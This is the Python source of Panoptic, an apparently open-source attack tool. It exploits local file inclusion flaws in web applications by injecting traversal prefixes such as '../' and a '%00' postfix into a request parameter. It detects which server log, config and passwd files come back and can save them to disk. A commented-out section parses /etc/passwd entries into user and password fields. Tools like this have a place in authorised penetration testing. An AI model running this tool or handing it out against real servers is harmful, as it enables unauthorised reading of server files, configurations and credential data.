#!/usr/bin/env python

"""
Panoptic

Search default file locations through LFI for common log and config files
"""

import difflib
import os
import random
import re
import string
import time
import xml.etree.ElementTree as ET

from urllib import urlencode
from urllib2 import urlopen, Request
from urlparse import urlsplit, parse_qsl
from optparse import OptionParser
from sys import exit

NAME = "Panoptic"
VERSION = "v0.1"
URL = "https://github.com/lightos/Panoptic/"

# Used for retrieving response for a dummy filename
INVALID_FILENAME = "".join(random.sample(string.letters, 10))

# Location of file containing test cases
CASES_FILE = "cases.xml"

# Used for heuristic comparison of responses
HEURISTIC_RATIO = 0.9

# ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
BANNER = """
 .-',--.`-.
<_ | () | _>
  `-`=='-'

%s %s (%s)
""" % (NAME, VERSION, URL)

EXAMPLES = """
Examples:
./panoptic.py --url "http://localhost/lfi.php?file=test.txt"
./panoptic.py --url "http://localhost/lfi.php?file=test.txt&id=1" --param file
./panoptic.py --url "http://localhost/lfi.php" --data "file=test.txt&id=1" --param file

./panoptic.py --list software
./panoptic.py --list category
./panoptic.py --list os

./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --os Windows
./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --software WAMP
"""

def get_cases(args):
    """
    Parse XML and return testing cases filtered by provided args
    """

    tree = ET.parse(CASES_FILE)
    root = tree.getroot()

    def _(parent, element):
        element.parent = parent
        for key, value in element.attrib.items():
            setattr(element, key, value)
        for child in element.getchildren():
            _(element, child)

    _(None, root)

    for attr in ("os", "software", "category"):
        if getattr(args, attr):
            for element in root.iterfind(".//%s" % attr):
                if element.value.lower() != getattr(args, attr).lower():
                    element.parent.remove(element)

    if args.type:
        for _ in (_ for _ in ("conf", "log", "other") if _.lower() != args.type.lower()):
            for element in root.iterfind(".//%s" % _):
                element.parent.remove(element)

    def _(element, tag):
        while element.parent is not None:
            if element.parent.tag == tag:
                return element.parent
            else:
                element = element.parent

    cases = []

    for element in root.iterfind(".//file"):
        case = {}
        case["location"] = element.value
        case["os"] = _(element, "os").value
        case["category"] = _(element, "category").value
        case["software"] = _(element, "software").value
        case["type"] = _(element, "log") is not None and "log" or _(element, "conf") is not None and "conf"
        cases.append(case)        

    return cases

def parse_args():
    """
    Parses command line arguments
    """

    OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting

    parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=EXAMPLES)

    # Required
    parser.add_option("-u", "--url", dest="target",
                help="set the target to test")
    # Optional
    parser.add_option("-p", "--param", dest="param",
                help="set parameter name to test for")

    parser.add_option("-d", "--data", dest="data",
                help="set data for POST request")

    parser.add_option("-P", "--proxy", dest="proxy",
                help="set IP:PORT to use as socks proxy")

    parser.add_option("-o", "--os", dest="os",
                help="set operating system to limit searches to")

    parser.add_option("-s", "--software", dest="software",
                help="set name of the software to search for")

    parser.add_option("-c", "--category", dest="category",
                help="set specific category of software to look for")

    parser.add_option("-t", "--type", dest="type",
                help="set type of file to search for (\"conf\" or \"log\")")

    parser.add_option("-b", "--prefix", dest="prefix", default="",
                help="set prefix for file path (e.g. \"../\")")

    parser.add_option("-e", "--postfix", dest="postfix", default="",
                help="set prefix for file path (e.g. \"%00\")")

    parser.add_option("-m", "--multiplier", dest="multiplier", type="int", default=1,
                help="set number to multiply the prefix by")

    parser.add_option("-w", "--write-file", dest="write_file", action="store_true",
                help="write all found files to output folder")

    parser.add_option("-x", "--skip-passwd-test", dest="skip_passwd", action="store_true",
                help="skip special tests if *NIX passwd file is found")

    parser.add_option("-l", "--list", dest="list",
                help="list available filters (\"os\", \"category\", \"software\")")

    parser.add_option("-v", "--verbose", action="store_true", dest="verbose",
                help="display extra information in the output")

    args = parser.parse_args()[0]

    if not any((args.target, args.list)):
        parser.error('missing argument for url. Use -h for help')

    if args.prefix:
        args.prefix = args.prefix * args.multiplier

    return args

def main():
    """
    Initializes and executes the program
    """

    print(BANNER)

    found = False
    args = parse_args()

    cases = get_cases(args)

    if args.list:
        print("[i] Listing available filters for usage with option '--%s':\n" % args.list)

        for _ in set([_[args.list] for _ in cases]):
            print _ if re.search(r"\A[A-Za-z0-9]+\Z", _) else '"%s"' % _

        exit()

    print("[i] Starting scan at: %s\n" % time.strftime("%X"))

    parsed_url = urlsplit(args.target)
    request_params = args.data if args.data else parsed_url.query

    if not args.param:
        args.param = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", request_params).group(1)

    def prepare_request(payload):
        """
        Prepares HTTP (GET or POST) request with proper payload
        """

        armed_query = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % args.param,
                                r"\1=%s" % payload, request_params)

        request_args = {"target": "%s://%s%s" % (parsed_url.scheme or "http", parsed_url.netloc, parsed_url.path)}

        if args.data:
            request_args["data"] = armed_query
        else:
            request_args["target"] += "?%s" % armed_query

        return request_args

    def clean_response(response, filepath):
        """
        Cleans response from occurrences of filepath
        """

        response = response.replace(filepath, "")
        regex = re.sub(r"[^A-Za-z0-9]", "(.|&\w+;|%[0-9A-Fa-f]{2})", filepath)

        return re.sub(regex, "", response, re.I)

    print("[*] Checking invalid response...")

    request_args = prepare_request(INVALID_FILENAME)
    invalid_response, _ = get_page(**request_args)

    print("[*] Done!\n")
    print("[*] Searching for files...")

    for case in cases:
        if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
            args.prefix = args.prefix[:-1]

        request_args = prepare_request("%s%s%s" % (args.prefix, case["location"], args.postfix))
        html, _ = get_page(**request_args)

        if not html:
            continue

        matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(invalid_response, INVALID_FILENAME))

        if matcher.quick_ratio() < HEURISTIC_RATIO:
            if not found:
                found = True

                print("[*] Possible file(s) found!\n")

                if case["os"]:
                    print("[*] OS: %s\n" % case["os"])

            print("[+] File: %s" % case)

            # If --write-file is set.
            if args.write_file:
                _ = os.path.join("output", parsed_url.netloc)
                if not os.path.exists(_):
                    os.makedirs(_)
                with open(os.path.join(_, "%s.txt" % case["location"].replace("/", "_")), "w") as f:
                    f.write(html)

            # If --skip-passwd-test not set.
            #if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_passwd:
            #    users = re.findall("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
            #    for user in users:
            #        username, password, uid, gid, info, home = user

    if not found:
        print("[*] No files found!")

    print("\n[*] File search complete.")
    print("\n[i] Finishing scan at: %s\n" % time.strftime("%X"))

def get_page(**kwargs):
    """
    Retrieves page content from a given target URL
    """

    url = kwargs.get("target", None)
    post = kwargs.get("data", None)
    header = kwargs.get("header", None)
    cookie = kwargs.get("cookie", None)
    proxy = kwargs.get("proxy", False)
    user_agent = kwargs.get("user_agent", None)
    verbose = kwargs.get("verbose", False)

    headers = {}
    parsed_url = None
    page = None

    if url is None:
        raise Exception("[!] URL cannot be None.")

    try:
        parsed_url = urlsplit(url)
    except:
        raise Exception("[!] Unable to parse URL: %s" % url)

    if proxy:
        import socket
        import thirdparty.socks.socks

        ip, port = proxy.split(':')
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port), True)
        socket.socket = socks.socksocket

    if user_agent is None:
        user_agent = "%s %s" % (NAME, VERSION)

    if post is None:
        url = "%s://%s%s?%s" % (parsed_url.scheme or "http", parsed_url.netloc, parsed_url.path,
                                urlencode(parse_qsl(parsed_url.query)))
    else:
        post = urlencode(parse_qsl(post), "POST")

    # Perform HTTP Request
    try:
        headers["User-agent"] = user_agent
        headers["Accept"] = "*"  # Set option to add headers in cmdline

        req = Request(url, post, headers)
        conn = urlopen(req)

        # Get HTTP Response
        page = conn.read()
        code = conn.code
        status = conn.msg
        responseHeaders = conn.info()

    except IOError, e:
        if hasattr(e, "reason"):
            if verbose:
                print("[!] Error msg: %d" % e.msg)
                print("[!] HTTP error code: %d" % e.code)
                print("[!] Response headers: %d" % e.info())

    return page, parsed_url

if __name__ == "__main__":
    main()
